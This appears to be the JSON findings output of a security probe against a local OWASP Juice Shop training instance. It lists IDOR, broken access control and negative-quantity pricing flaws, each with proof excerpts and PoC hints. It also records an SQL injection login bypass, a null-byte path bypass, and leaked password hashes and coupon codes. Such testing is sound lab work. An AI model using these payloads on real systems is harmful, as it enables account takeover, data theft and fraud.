@@ -1,0 +1,140 @@
+{
+  "ok": true,
+  "summary": "Comprehensive authz/logic differentials probe completed. Tested with dual actors (admin, user_a, user_b) across all identified surfaces. Found 15 bookable candidates across IDOR, broken access control, business logic flaws, and data exposure categories.",
+  "surfaces": [
+    {"location": "http://127.0.0.1:3010/api/Users/{id}"},
+    {"location": "http://127.0.0.1:3010/rest/basket/{id}"},
+    {"location": "http://127.0.0.1:3010/api/BasketItems"},
+    {"location": "http://127.0.0.1:3010/rest/products/{id}/reviews"},
+    {"location": "http://127.0.0.1:3010/rest/admin/application-configuration"},
+    {"location": "http://127.0.0.1:3010/rest/admin/application-version"},
+    {"location": "http://127.0.0.1:3010/rest/order-history"},
+    {"location": "http://127.0.0.1:3010/rest/track-order/{orderId}"},
+    {"location": "http://127.0.0.1:3010/api/Feedbacks"},
+    {"location": "http://127.0.0.1:3010/api/Quantitys"},
+    {"location": "http://127.0.0.1:3010/api/Addresss"},
+    {"location": "http://127.0.0.1:3010/api/Cards"},
+    {"location": "http://127.0.0.1:3010/rest/memories"},
+    {"location": "http://127.0.0.1:3010/rest/user/whoami"},
+    {"location": "http://127.0.0.1:3010/api/Challenges"},
+    {"location": "http://127.0.0.1:3010/rest/basket/{id}/checkout"},
+    {"location": "http://127.0.0.1:3010/ftp/"},
+    {"location": "http://127.0.0.1:3010/ftp/coupons_2013.md.bak%2500.md"}
+  ],
+  "candidates": [
+    {
+      "title": "IDOR - Cross-User Basket Checkout (Order Theft)",
+      "location": "POST http://127.0.0.1:3010/rest/basket/{id}/checkout",
+      "proof_excerpt": "User A (bid=9) successfully checked out User B's basket (bid=10) with items User B had added, receiving orderConfirmation \"f806-5f3ba92e2a9463d2\". The order appeared in User A's order history (totalPrice:3.98) while User B's order history was empty. This allows any authenticated user to steal another user's basket items.",
+      "poc_hint": "Authenticate as different user, POST /rest/basket/{victim_basket_id}/checkout"
+    },
+    {
+      "title": "IDOR - Cross-User Profile Access",
+      "location": "GET http://127.0.0.1:3010/api/Users/{id}",
+      "proof_excerpt": "GET /api/Users/31 as User A returned {\"email\":\"testuser_b@test.com\",\"role\":\"customer\"}. GET /api/Users/1 as User A returned {\"email\":\"admin@juice-sh.op\",\"role\":\"admin\"}. Any authenticated user can read any user's profile including email, role, and isActive status.",
+      "poc_hint": "GET /api/Users/{target_id} with any valid JWT token"
+    },
+    {
+      "title": "IDOR - Cross-User Basket Reading",
+      "location": "GET http://127.0.0.1:3010/rest/basket/{id}",
+      "proof_excerpt": "GET /rest/basket/10 (User B's basket) as User A returned {\"id\":10,\"UserId\":31,\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"price\":1.99}]}. GET /rest/basket/1 (admin's basket) as User A also returned full basket data.",
+      "poc_hint": "GET /rest/basket/{target_bid} with any valid JWT token"
+    },
+    {
+      "title": "Broken Access Control - Admin Configuration Leak",
+      "location": "GET http://127.0.0.1:3010/rest/admin/application-configuration",
+      "proof_excerpt": "GET /rest/admin/application-configuration as regular user (User A) returned full config object containing: Google OAuth clientId \"1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com\", full product catalog with prices/deluxePrices, all challenge configurations with XSS bonus payload, chatbot model/avatar settings, social media URLs, CSF hash, and memory data with geo-stalking answers.",
+      "poc_hint": "GET /rest/admin/application-configuration with any valid JWT (no admin role required)"
+    },
+    {
+      "title": "Broken Access Control - Admin Version Endpoint",
+      "location": "GET http://127.0.0.1:3010/rest/admin/application-version",
+      "proof_excerpt": "GET /rest/admin/application-version as regular user returned {\"version\":\"20.1.1\"}. Admin-only version info is accessible to any authenticated user.",
+      "poc_hint": "GET /rest/admin/application-version with any valid JWT"
+    },
+    {
+      "title": "Business Logic - Negative Quantity Pricing Manipulation",
+      "location": "POST http://127.0.0.1:3010/api/BasketItems",
+      "proof_excerpt": "POST with {\"ProductId\":2,\"BasketId\":9,\"quantity\":-5} returned success with {\"quantity\":-5}. Checkout resulted in order with totalPrice:-14.950000000000001 and products:[{\"quantity\":-5,\"name\":\"Orange Juice (1000ml)\",\"price\":2.99,\"total\":-14.95}]. Negative quantities produce negative total prices.",
+      "poc_hint": "POST /api/BasketItems with negative quantity value to get negative order totals"
+    },
+    {
+      "title": "Forged Feedback - Cross-User Feedback Submission",
+      "location": "POST http://127.0.0.1:3010/api/Feedbacks",
+      "proof_excerpt": "POST as User A with {\"UserId\":31,\"comment\":\"Forged feedback from A pretending to be B\",\"rating\":3,\"captchaId\":2,\"captcha\":\"12\"} returned success with {\"id\":16,\"UserId\":31}. User A successfully submitted feedback attributed to User B.",
+      "poc_hint": "POST /api/Feedbacks with arbitrary UserId value to impersonate other users"
+    },
+    {
+      "title": "Broken Access Control - Unauthorized Feedback Deletion",
+      "location": "DELETE http://127.0.0.1:3010/api/Feedbacks/{id}",
+      "proof_excerpt": "DELETE /api/Feedbacks/1 as User A (non-admin) returned {\"status\":\"success\",\"data\":{}}. Any authenticated user can delete any feedback without authorization.",
+      "poc_hint": "DELETE /api/Feedbacks/{id} with any valid JWT"
+    },
+    {
+      "title": "Excessive Data Exposure - Memories API Leaks Password Hashes",
+      "location": "GET http://127.0.0.1:3010/rest/memories",
+      "proof_excerpt": "GET /rest/memories as User A returned 10 memories each with full User object including password hashes: {\"email\":\"bjoern@owasp.org\",\"password\":\"cc03e747a6afbbcbf8be7668acfebee5\"}, {\"email\":\"bjoern.kimminich@gmail.com\",\"password\":\"6edd9d726cbdc873c539e41ae8757b8c\"}, {\"email\":\"ethereum@juice-sh.op\",\"password\":\"2c17c6393771ee3048ae34d6b380c5ec\"}, {\"email\":\"john@juice-sh.op\",\"password\":\"00479e957b6b42c459ee5746478e4d45\"}, {\"email\":\"emma@juice-sh.op\",\"password\":\"402f1c4a75e316afec5a6ea63147f739\"}. Also exposes deluxeToken values.",
+      "poc_hint": "GET /rest/memories with any valid JWT to get all user password hashes"
+    },
+    {
+      "title": "Unauthenticated Order Tracking",
+      "location": "GET http://127.0.0.1:3010/rest/track-order/{orderId}",
+      "proof_excerpt": "GET /rest/track-order/f806-ce62ebfcca035608 without any authentication returned full order details: {\"totalPrice\":-14.95,\"products\":[{\"quantity\":-5,\"name\":\"Orange Juice (1000ml)\",\"price\":2.99,\"total\":-14.95}],\"email\":\"t*st*s*r_*@t*st.c*m\"}. GET /rest/track-order/5267-3122026aa8431150 as User A returned admin's order with masked email.",
+      "poc_hint": "Any order can be tracked without authentication using its orderId"
+    },
+    {
+      "title": "IDOR - Cross-User BasketItem Access",
+      "location": "GET http://127.0.0.1:3010/api/BasketItems?basketId={id}",
+      "proof_excerpt": "GET /api/BasketItems?basketId=10 as User A returned all BasketItems across multiple baskets (baskets 2,3,4,5) including items that do not belong to User A. The basketId filter appears to be ignored, leaking global basket data.",
+      "poc_hint": "GET /api/BasketItems with any basketId parameter"
+    },
+    {
+      "title": "Excessive Data Exposure - Challenge Definitions",
+      "location": "GET http://127.0.0.1:3010/api/Challenges",
+      "proof_excerpt": "GET /api/Challenges without authentication returned all challenge definitions including names, categories, difficulty levels, descriptions, and solved status for 100+ challenges. Exposes internal CTF challenge structure.",
+      "poc_hint": "GET /api/Challenges - no authentication required"
+    },
+    {
+      "title": "Excessive Data Exposure - Inventory and Stock Levels",
+      "location": "GET http://127.0.0.1:3010/api/Quantitys",
+      "proof_excerpt": "GET /api/Quantitys as User A returned all product quantities and per-user limits for 56 products. Reveals inventory levels (e.g., ProductId 27 has quantity 0, ProductId 33 has limitPerUser:1) enabling stock manipulation attacks.",
+      "poc_hint": "GET /api/Quantitys with any valid JWT"
+    },
+    {
+      "title": "Weak Access Control - Coupon Code Exposure in FTP",
+      "location": "GET http://127.0.0.1:3010/ftp/coupons_2013.md.bak%2500.md",
+      "proof_excerpt": "GET /ftp/coupons_2013.md.bak%2500.md (null byte bypass) returned coupon codes: n<MibgC7sn, mNYS#gC7sn, o*IVigC7sn, k#pDlgC7sn, etc. Coupon data leaked via directory listing and null byte bypass.",
+      "poc_hint": "Use null byte injection (%2500.md) to access .bak files in /ftp/"
+    },
+    {
+      "title": "Unauthenticated Order History (Admin)",
+      "location": "GET http://127.0.0.1:3010/rest/order-history",
+      "proof_excerpt": "GET /rest/order-history as admin returned order history with partially masked emails e.g. \"*dm*n@j**c*-sh.*p\" and product details. Note: regular users only see their own orders but admin sees all. Order tracking is completely unauthenticated.",
+      "poc_hint": "Admin can view all orders; order tracking via /rest/track-order is public"
+    }
+  ],
+  "facts": [
+    "Admin user (id=1, bid=1) obtained via SQL injection login bypass (email=' OR 1=1--)",
+    "User A created: id=30, bid=9, role=customer, email=testuser_a@test.com",
+    "User B created: id=31, bid=10, role=customer, email=testuser_b@test.com",
+    "JWT tokens use RS256 algorithm - no expiry (iat only, no exp claim)",
+    "Basket items can be added with negative quantities - no input validation on quantity",
+    "Checkout succeeds with empty baskets, negative totals, and with addressId parameter",
+    "Feedback requires captcha which exposes answer in response",
+    "/rest/admin/application-configuration is accessible to all authenticated users regardless of role",
+    "Password hashes are MD5 (cryptographically weak) stored in database and exposed via multiple endpoints",
+    "memories API includes full user objects with password hashes via Sequelize eager loading",
+    "No CSRF protection on API endpoints (Bearer token only, no CSRF tokens)"
+  ],
+  "deadends": [
+    "PATCH /api/Users/{id} - Unexpected path error (500) - user profile update via API not supported",
+    "/rest/basket/{id}/coupon - Unexpected path for all methods (GET/POST/PUT/DELETE) - coupon application via REST API not found",
+    "/rest/products/{id}/reviews - POST/DELETE/PATCH all return 'Unexpected path' (500) - review management via REST not supported",
+    "/api/Addresss/{id} - 'Malicious activity detected' when accessing address owned by another user",
+    "/rest/user/whoami - Returns empty user object {} even with Authorization header - may use cookie-based auth",
+    "/rest/order-history - Blocks with 'Blocked illegal activity' for requests from certain IPs",
+    "/api/ (root) - Unexpected path error (500) - no API index/root endpoint",
+    "/administration - Returns SPA HTML, not actual admin panel",
+    "POST /rest/basket/{id}/checkout with addressId parameter works but doesn't prevent unauthorized basket access"
+  ]
+}
